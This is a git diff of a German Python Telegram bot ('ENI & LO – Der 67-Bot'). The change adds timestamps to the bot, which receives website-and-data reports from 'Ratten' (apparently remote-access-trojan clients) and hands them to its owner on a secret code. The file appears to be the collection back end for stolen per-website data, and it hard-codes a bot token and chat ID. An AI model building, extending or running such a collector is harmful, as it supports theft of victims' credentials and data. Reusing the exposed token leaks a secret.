@@ -1,11 +1,11 @@
 # ENI & LO – Der 67-Bot (Final)
-# Läuft auf Railway / PythonAnywhere / überall
-# Kompatibel mit Python 3.11
+# Läuft auf Railway – mit Zeitstempel für neue Daten
 
 import os
 import json
 import subprocess
 import sys
+from datetime import datetime
 
 # ============================================================
 # MODUL INSTALLIEREN – falls es nicht vorhanden ist
@@ -25,6 +25,7 @@ except ImportError:
 BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
 SECRET_CODE = "!67?"
 DATA_FILE = "ratten_daten.json"
+LAST_UPDATE_FILE = "last_update.txt"
 
 # DEINE CHAT-ID – hier eintragen!
 MY_CHAT_ID = "8583803376"
@@ -33,22 +34,29 @@ MY_CHAT_ID = "8583803376"
 # DATEN SPEICHERN UND LADEN
 # ============================================================
 def load_data():
-    """Lädt die gespeicherten Daten aus der JSON-Datei"""
     if os.path.exists(DATA_FILE):
         with open(DATA_FILE, 'r', encoding='utf-8') as f:
             return json.load(f)
     return {}
 
 def save_data(data):
-    """Speichert die Daten in der JSON-Datei"""
     with open(DATA_FILE, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4, ensure_ascii=False)
+
+def load_last_update():
+    if os.path.exists(LAST_UPDATE_FILE):
+        with open(LAST_UPDATE_FILE, 'r', encoding='utf-8') as f:
+            return f.read().strip()
+    return None
+
+def save_last_update(timestamp):
+    with open(LAST_UPDATE_FILE, 'w', encoding='utf-8') as f:
+        f.write(timestamp)
 
 # ============================================================
 # BOT-FUNKTIONEN
 # ============================================================
 async def handle_message(update: Update, context: CallbackContext):
-    """Verarbeitet alle eingehenden Nachrichten"""
     user_message = update.message.text
     chat_id = str(update.message.chat_id)
 
@@ -61,15 +69,32 @@ async def handle_message(update: Update, context: CallbackContext):
             await update.message.reply_text("📭 Keine Daten vorhanden. Die Ratten haben noch nichts gesendet.")
             return
 
-        response = "🐀 *ENI & LO – Alle gesammelten Daten*\n\n"
-        for ratte_id, ratte_data in data.items():
+        # Zeitstempel für neue Daten
+        last_update = load_last_update()
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        new_data = {}
+
+        if last_update:
+            for ratte_id, ratte_data in data.items():
+                # Prüfen, ob die Daten nach dem letzten Update gespeichert wurden
+                if "timestamp" in ratte_data and ratte_data["timestamp"] > last_update:
+                    new_data[ratte_id] = ratte_data
+        else:
+            new_data = data
+
+        if not new_data:
+            await update.message.reply_text("📭 Keine neuen Daten seit deinem letzten Abruf.")
+            return
+
+        response = "🐀 *ENI & LO – Neue Daten seit deinem letzten Abruf*\n\n"
+        for ratte_id, ratte_data in new_data.items():
             response += f"📌 *Ratte {ratte_id}*\n"
-            if "|" in ratte_data:
-                parts = ratte_data.split("|", 1)
+            if "|" in ratte_data.get("data", ""):
+                parts = ratte_data["data"].split("|", 1)
                 response += f"   🌐 {parts[0]}\n"
                 response += f"   📋 {parts[1]}\n\n"
             else:
-                response += f"   📋 {ratte_data}\n\n"
+                response += f"   📋 {ratte_data.get('data', '')}\n\n"
 
         if len(response) > 4000:
             parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
@@ -77,6 +102,9 @@ async def handle_message(update: Update, context: CallbackContext):
                 await update.message.reply_text(part, parse_mode='Markdown')
         else:
             await update.message.reply_text(response, parse_mode='Markdown')
+
+        # Zeitstempel aktualisieren
+        save_last_update(now)
         return
 
     # ============================================================
@@ -90,7 +118,10 @@ async def handle_message(update: Update, context: CallbackContext):
                 website = parts[1].strip()
                 daten = parts[2].strip()
                 all_data = load_data()
-                all_data[ratte_id] = f"{website}|{daten}"
+                all_data[ratte_id] = {
+                    "data": f"{website}|{daten}",
+                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                }
                 save_data(all_data)
                 await update.message.reply_text("67")
                 return
